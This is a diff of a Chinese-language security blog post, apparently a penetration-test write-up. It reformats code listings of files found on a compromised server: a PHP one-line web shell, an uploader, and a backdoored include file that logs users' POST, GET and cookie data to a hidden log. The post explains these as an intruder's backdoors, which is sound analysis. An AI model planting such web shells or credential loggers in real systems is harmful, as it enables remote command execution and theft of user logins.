@@ -152,37 +152,29 @@ Facebook 大致有以下限制:
 
 其中幾個檔案的內容如下
 
-**sshpass**  
+<div class="highlight-name">sshpass</div>  
 <pre><code>沒錯，就是那個 <a href='http://linux.die.net/man/1/sshpass'>sshpass</a></code></pre>
-**bN3d10Aw.php**
-{% highlight php %}
-<?php echo shell_exec($_GET['c']); ?>
-{% endhighlight %}
+<div class="highlight-name">bN3d10Aw.php</div>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
 
-**uploader.php**
-{% highlight php %}
-<?php move_uploaded_file($_FILES["f]["tmp_name"], basename($_FILES["f"]["name"])); ?>
-{% endhighlight %}
+<div class="highlight-name">uploader.php</div>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"f]["</span><span class="nx">tmp_name</span><span class="s2">"], basename(</span><span class="si">$_FILES["f"]</span><span class="s2">["</span><span class="nx">name</span><span class="s2">"])); ?&gt;</span></code></pre></div>
 
-**d.php**
-{% highlight php %}
-<?php include_oncce("/home/seos/courier/remote.inc"); echo decrypt($_GET["c"]); ?>
-{% endhighlight %}
+<div class="highlight-name">d.php</div>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nx">include_oncce</span><span class="p">(</span><span class="s2">"/home/seos/courier/remote.inc"</span><span class="p">);</span> <span class="k">echo</span> <span class="nx">decrypt</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"c"</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
 
-**sclient\_user\_class\_standard.inc**
-{% highlight php %}
-<?php
-include_once('sclient_user_class_standard.inc.orig');
-$fp = fopen("/home/seos/courier/B3dKe9sQaa0L.log", "a");
-$retries = 0;
-$max_retries = 100;
+<div class="highlight-name">sclient\_user\_class\_standard.inc</div>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">include_once</span><span class="p">(</span><span class="s1">'sclient_user_class_standard.inc.orig'</span><span class="p">);</span>
+<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"/home/seos/courier/B3dKe9sQaa0L.log"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">);</span>
+<span class="nv">$retries</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$max_retries</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
 
-// 省略...
+<span class="c1">// 省略...</span>
 
-fwrite($fp, date("Y-m-d H:i:s T") . ";" . $_SERVER["REMOTE_ADDR"] . ";" . $_SERVER["HTTP_USER_AGENT"] . ";POST=" . http_build_query($_POST) . ";GET=" . http_build_query($_GET) . ";COOKIE=" . http_build_query($_COOKIE) . "\n");
+<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"Y-m-d H:i:s T"</span><span class="p">)</span> <span class="o">.</span> <span class="s2">";"</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]</span> <span class="o">.</span> <span class="s2">";"</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"HTTP_USER_AGENT"</span><span class="p">]</span> <span class="o">.</span> <span class="s2">";POST="</span> <span class="o">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">)</span> <span class="o">.</span> <span class="s2">";GET="</span> <span class="o">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">)</span> <span class="o">.</span> <span class="s2">";COOKIE="</span> <span class="o">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
 
-// 省略...
-{% endhighlight %}
+<span class="c1">// 省略...</span></code></pre></div>
 
 前幾個就是很標準的 PHP 一句話木馬  
 其中比較特別的是 "**sclient\_user\_class\_standard.inc**" 這個檔案  
